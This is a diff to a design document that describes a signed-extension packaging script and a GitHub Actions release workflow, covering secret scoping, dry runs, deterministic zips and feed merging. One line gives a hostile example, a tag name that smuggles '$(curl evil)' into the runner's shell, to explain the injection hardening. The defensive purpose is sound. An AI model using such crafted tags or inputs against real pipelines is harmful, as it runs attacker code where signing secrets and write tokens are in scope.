@@ -636,9 +636,15 @@ same CS2DemoKit version and app contract. The loader enforces that and disables,
 37. **CI and packaging.** A release workflow per extension producing the signed zip and feed entry; the
     app installer still bundles the extension version current at app release time.
     *As built (2026-10-03):* `scripts/pack-extension.sh` (build, stage, sign, zip, feed entry) and
-    `.github/workflows/release-extension.yml` (the release gate and the feed update), plus five new
+    `.github/workflows/release-extension.yml`, two jobs (`build-and-pack`, `contents: read`; `publish`,
+    `needs: build-and-pack`, `contents: write`, gated on `do_publish`), plus five new
     `tools/extension-signing` commands (`report`, `manifest`, `zip`, `feed-merge`/`feed-check`) and a
-    packaging-drift step added to `ci.yml`'s `build` job. Section 7.11 has the tag convention, the zip
+    packaging-drift step added to `ci.yml`'s `build` job. Every dispatch input and ref-derived value
+    passes through a step's `env:` rather than `${{ }}` in `run:` text, and the resolved id is checked
+    against the manifest id shape before use; the signing secret is scoped to `build-and-pack` and only
+    passed when `do_publish == '1'`, and `pack-extension.sh` itself refuses that secret in `--dry-run`
+    regardless. The rolling feed is merged and validated before the per-version release is touched, so
+    a refused downgrade leaves nothing orphaned. Section 7.11 has the rest: the tag convention, the zip
     layout as produced, the feed update rules, the secrets and the owner action, the dry-run path, and
     how to cut a release step by step. Nothing changes in `release.yml`: the app installer bundles
     whichever extension version the heads reference at app release time, same as before this item.
@@ -647,8 +653,8 @@ same CS2DemoKit version and app contract. The loader enforces that and disables,
     because that touches `ShippedPack.BesideApp`, the app csproj and the loader/matrix tests, none of
     which are this item's hot file (a release workflow); it is still item 37's to do, just not done here,
     and stays a one-extension limitation until it is. (2) The release workflow's concurrency group is a
-    fixed id-or-default string, not a per-id group computed from the triggering tag, for the same
-    one-extension reason (section 7.11 has the detail).
+    constant string, not one computed per extension id, for the same one-extension reason (section 7.11
+    has the detail).
 38. **Compatibility matrix test.** A test that builds the extension against the app and asserts the
     manifest's ranges match the referenced versions, so a release cannot ship an unloadable pair.
     *As built (2026-10-03):* `CompatibilityMatrixTests` in App.Tests, plus `CompatibilityReport`
@@ -1832,26 +1838,32 @@ way locally and in CI. In order:
 4. Stages exactly what the extension project itself produces. The built `.deps.json`'s own entry for
    the project (keyed `<AssemblyName>/<nbgv-version>`) lists, under `runtime` and `resources`, only the
    files that project's own compile output contributes; every referenced project and package is a
-   separate entry, never folded in. That is "the project's own output minus every reference" without
+   separate entry, never folded in. The script copies every path each of those two lists names (not a
+   hardcoded `<AssemblyName>.dll`), so this is "the project's own output minus every reference" without
    hand-walking a reference closure. A `native` or `runtimeTargets` key on that same entry would mean a
    RID-specific asset the extension itself ships, which this script refuses to package, stopping with an
    error rather than shipping a half-correct zip (the shipped extension has none today). The `.xml` doc
-   file is staged when the build produced one; the manifest staged is the repo copy, not the build's
-   `PreserveNewest` copy beside the DLL, though the next step proves them equal.
+   file is staged separately when the build produced one (`deps.json` does not track it); the manifest
+   staged is the repo copy, not the build's `PreserveNewest` copy beside the DLL, though the next step
+   proves them equal.
 5. Reads the manifest embedded in the built DLL (`extension-signing manifest <dll>`, straight out of the
-   PE's resource metadata, no assembly load) and fails if it is not byte-identical to the repo file.
+   PE's resource metadata, no assembly load, written with `Console.Out.Write` rather than `WriteLine` so
+   the output carries no extra trailing newline the embedded text did not already have) and `cmp`s it
+   byte for byte against the repo file, never a string compare through `$(...)` (which would silently
+   swallow a trailing-newline difference).
 6. Prints `CompatibilityReport.Describe` for the manifest against the host values from step 1
    (`extension-signing report <manifest.json> --contract <ver> --cs2demokit <ver>`) and fails the whole
    run if it is not compatible: a release workflow should not ship a pairing it already knows cannot
    load.
-7. Signs the staged directory. A key comes from `--key <path>` (local or dry-run testing: an
-   ephemeral key `extension-signing keygen` writes is never in `PublisherKeys.Current`, so verification
-   below is told to check against that key's own public half instead) or from `DV_EXTENSION_SIGNING_KEY`
-   (the real secret: written to a `mktemp` file, `chmod 600`, used, then removed by a `trap ... EXIT`;
-   verification then runs with no override, against `PublisherKeys.Current`, so a secret that is not the
-   key behind `Primary` fails here rather than shipping a zip no app will trust). A real run (no
-   `--dry-run`) with no key available fails outright with the owner action below; a dry run only notes it
-   and ships an unsigned zip, which packaging-drift checks (item 3 below) is all that needs.
+7. Signs the staged directory. `--dry-run` never reads `DV_EXTENSION_SIGNING_KEY`, signed or not: a
+   dry run signs only with an explicit `--key` (expected to be an ephemeral `extension-signing keygen`
+   key, never in `PublisherKeys.Current`, so verification is told to check against that key's own
+   public half instead), so the production key can never end up on an unpublished artifact even if a
+   caller sets the secret alongside `--dry-run`. A real run reads `DV_EXTENSION_SIGNING_KEY` into a
+   `mktemp` file (`chmod 600`, removed by a `trap ... EXIT`) and verifies with no override, against
+   `PublisherKeys.Current`, so a secret that is not the key behind `Primary` fails here rather than
+   shipping a zip no app will trust. A real run with no key available fails outright with the owner
+   action below; a dry run with none notes it and ships an unsigned zip.
 8. Zips the staged directory deterministically (`extension-signing zip`, `DeterministicZip` below:
    entries sorted ordinal by `/`-path, every entry's timestamp fixed to 1980-01-01 and its Unix mode
    normalized to `0644`, no directory entries) to
@@ -1893,7 +1905,9 @@ no Avalonia in this tool):
   keep different files: this one keeps `extension.sig`, the digest walk skips it), sorted entries, a
   fixed `ZipArchiveEntry.LastWriteTime` (1980-01-01, the DOS epoch) and `ExternalAttributes` (Unix
   `0644`) on every entry so two zips of the same tree hash the same regardless of the machine's clock or
-  umask. Verified by zipping the real extension output twice and diffing the sha.
+  umask. Verified by zipping the same staged, unsigned directory twice within one run and diffing the
+  sha; a resigned build's zip differs in `extension.sig`'s `signature` field alone, since ECDSA signing
+  draws a fresh random nonce every time, never in the digest or anything the zip mechanism controls.
 - `feed-merge <existing.json> <entry.json> --id <id> --out <merged.json> [--allow-downgrade]` and
   `feed-check <feed.json>` link `ExtensionFeed.cs` (already linking `ExtensionManifest.cs` et al. for
   `report`). The merge itself is `ExtensionFeedMerge.Merge` in its own file,
@@ -1935,53 +1949,67 @@ one version's assets and never changes; the third holds the one `extensions.json
 is merged into and is replaced on every release.
 
 **`.github/workflows/release-extension.yml`.** Triggered by a push matching `extensions/*/v*`, or
-`workflow_dispatch` with an `id` input (default `net.demoviewer.pack.stratbook`, since there is only one
-extension) and a `dry_run` input (default `true`) and `allow_downgrade` (default `false`). A first step
-resolves, before anything else runs, both the id (parsed from the tag when the ref is one, else the
-`id` input) and whether this run actually publishes: a tag push always publishes; a dispatch run
-publishes only when its ref IS that same tag AND `dry_run` is explicitly `false`; every other case,
-including a dispatch from a branch with `dry_run` left `false`, is a dry run regardless of the input,
-since a branch is never the thing a release tag names. The job then runs the ext suite's standard tier,
-builds `App.Tests` and runs `CompatibilityMatrixTests` alone, then `pack-extension.sh` (with
-`DV_EXTENSION_SIGNING_KEY` from the repo secret; `--dry-run` appended when the resolved verdict says so),
-and uploads the zip, its sha256 and the feed entry fragment as a workflow artifact regardless of the
-verdict, so a dry run's output is inspectable from the Actions UI without re-running anything.
+`workflow_dispatch` with an `id` input (`type: choice`, the one known id today), a `dry_run` input
+(default `true`) and `allow_downgrade` (default `false`). Two jobs, `build-and-pack` (`contents: read`)
+and `publish` (`needs: build-and-pack`, `contents: write`, gated on `do_publish`), so the write token
+and the signing secret are both out of scope for a dry run's job entirely, not merely unused by it.
 
-Only when the resolved verdict is "publish": creates the per-version `gh release` under the `<id>-v<version>`
-tag with the zip and its sha256 as assets, `--latest=false` (so this release never becomes GitHub's
-"latest", which would misdirect anyone browsing releases by eye; it has no bearing on how either
-Velopack's `GithubSource` or `vpk download github`'s delta seed pick the app's own release, since both
-walk the release list looking for an asset literally named `RELEASES`/`releases.<channel>.json`, never
-relying on "latest", and this release's only assets are the zip and its sha256). Then compares the
-uploaded asset's actual `.url` (`gh release view --json assets --jq`, the field confirmed by hand against
-a real release in this repo; the same call's `.apiUrl` is a different thing, the API endpoint, not the
-download link) against the url the feed entry fragment already computed, failing the job on any mismatch
-rather than publishing a feed entry that points at the wrong place.
+Every value that can carry attacker-supplied text (`github.event.inputs.*`, a ref-derived id) is passed
+through a step's `env:` and read back as a shell variable, never interpolated as `${{ }}` into `run:`
+script text: GitHub expands `${{ }}` into the script's source before the shell ever runs it, so a tag
+named `extensions/$(curl evil)/v1` or a crafted dispatch input would otherwise execute on the runner,
+signing secret and write token both in scope. `build-and-pack`'s first step resolves the id this way
+(from the tag when the ref is one, else the input) and refuses it outright unless it matches the
+manifest's own id shape (`ExtensionManifest.IsValidId`) before anything downstream touches it; it also
+resolves `do_publish`: a tag push always publishes, a dispatch run only when its ref IS that same tag
+and `dry_run` is explicitly `false`, every other case (including any dispatch from a branch) is a dry
+run regardless of the input, since a branch is never the thing a release tag names. `github.sha` and
+`github.repository` stay as direct `${{ }}` text (not user-suppliable; the existing convention in
+`release.yml`), everything else moves through `env:`.
 
-Then updates the rolling feed: `gh release view extensions-<id>` decides what "existing" means. A release
-that does not exist, or one whose asset list has no `extensions.json`, is the only case read as "no feed
-yet" (an empty merge target; the rolling release is created, `--latest=false`, if it was altogether
-absent). Any other failure (an auth problem, a rate limit, a transient API error) fails the job outright:
-treating "the download failed" as "there is no feed" would republish a one-entry feed over a real one with
-every other version's history in it. `extension-signing feed-merge` then merges the new entry (honoring
-`allow_downgrade`), `feed-check` validates the merged result, and `gh release upload --clobber` replaces
-the rolling release's `extensions.json` asset; the local file is named `extensions.json` before upload
-(not renamed through `gh`'s `#label` syntax, which sets a display label, never the served file name).
+`build-and-pack` then runs the ext suite's standard tier, builds `App.Tests`, runs
+`CompatibilityMatrixTests` alone, then `pack-extension.sh` (`DV_EXTENSION_SIGNING_KEY` passed only when
+`do_publish == '1'`; `--dry-run` appended otherwise, and the script itself refuses that secret in
+`--dry-run` regardless, so the gate holds even if a caller wires the secret unconditionally some other
+way), and uploads the zip, its sha256 and the feed entry fragment as a workflow artifact on every run,
+so a dry run's output is inspectable from the Actions UI without re-running anything.
 
-**Concurrency.** One group per extension would need the id before the job starts, which a tag push does
-not expose without a dedicated parse job (a job's own concurrency group cannot depend on its own steps'
-output); with exactly one extension today, `release-extension-${{ github.event.inputs.id || 'net.demoviewer.pack.stratbook' }}`
-is equivalent to "per extension" in practice, `cancel-in-progress: false` so two tag pushes queue rather
-than interleave. A second extension needs that parse job (or a job-per-extension matrix) before this
-still holds.
+`publish` runs only when `do_publish == '1'`, downloads that artifact, and merges and validates the
+rolling feed **before** touching the per-version release: a refused downgrade (or any other merge
+failure) then leaves nothing created or uploaded, never an orphan release with no feed entry. Fetching
+the existing feed treats "absent" (`gh release view extensions-<id>` reports no such release) as the
+only "no feed yet" case, since this run is then the one that creates that release; a release that
+exists but carries no `extensions.json` asset is left alone and fails the job, since that is an
+anomalous state (a prior run died mid-publish, or the asset was removed by hand) that needs manual
+repair, not a silent restart from empty. Any other `gh` failure (auth, a rate limit, a transient API
+error) also fails the job outright, for the same reason: taking "the download failed" as "there is no
+feed" would republish a one-entry feed over a real one with every other version's history in it.
 
-**Item 3: the dry-run packaging check.** `ci.yml`'s `build` job, after the normal solution build, runs
-`pack-extension.sh net.demoviewer.pack.stratbook --dry-run` with no signing key: the extension already
-built in that job, so this adds only the staging, zip and feed-entry steps, catching a packaging
+Only once the merge and `feed-check` succeed does `publish` create or update the per-version `gh
+release` under the `<id>-v<version>` tag with the zip and its sha256 as assets (idempotent against a
+re-run: `gh release view` first, `upload --clobber` if it already exists, `create` only if it does
+not), `--latest=false` (so this release never becomes GitHub's "latest", which would misdirect anyone
+browsing releases by eye; it has no bearing on how either Velopack's `GithubSource` or
+`vpk download github`'s delta seed pick the app's own release, since both walk the release list looking
+for an asset literally named `RELEASES`/`releases.<channel>.json`, never relying on "latest"). It then
+compares the uploaded asset's actual `.url` (`gh release view --json assets --jq`, the field confirmed
+by hand against a real release in this repo; the same call's `.apiUrl` is the API endpoint, not the
+download link) against the url the feed entry fragment already computed, failing on any mismatch. Last,
+it creates the rolling release (only if it did not already exist) and uploads the already-merged
+`extensions.json`, `--clobber`; the local file is named `extensions.json` before upload, not renamed
+through `gh`'s `#label` syntax, which sets a display label, never the served file name.
+
+**Concurrency.** A constant group, `release-extension`, not keyed on the id: with one extension this
+costs nothing (there is nothing else to serialize against), and it sidesteps needing the id before a
+job starts at all. A second extension that wants independent release cadences needs a per-id group fed
+by a job's own output to a dependent job, the shape `publish` already uses for `do_publish`.
+
+**The `ci.yml` dry-run step.** The `build` job, after the normal solution build, runs
+`pack-extension.sh net.demoviewer.pack.stratbook --dry-run` with no signing key, catching a packaging
 regression (a file the deps.json-derived staging list stops picking up, a manifest edited without a
-rebuild, a compatibility report gone `Incompatible`) on every PR rather than only when a release is
-actually cut. `release.yml` is untouched: it does not run on pull requests, and the app installer already
-bundles whichever extension version the heads reference at app release time with no change needed here.
+rebuild, a compatibility report gone `Incompatible`) on every PR rather than only when a release is cut.
+`release.yml` is untouched: it does not run on pull requests, and the app installer already bundles
+whichever extension version the heads reference at app release time with no change needed here.
 
 **Action before the first release.** Same secret `DV_EXTENSION_SIGNING_KEY` section 7.9 names: store the private key
 `keygen` wrote (outside every git working tree) as that GitHub repository secret, the same way
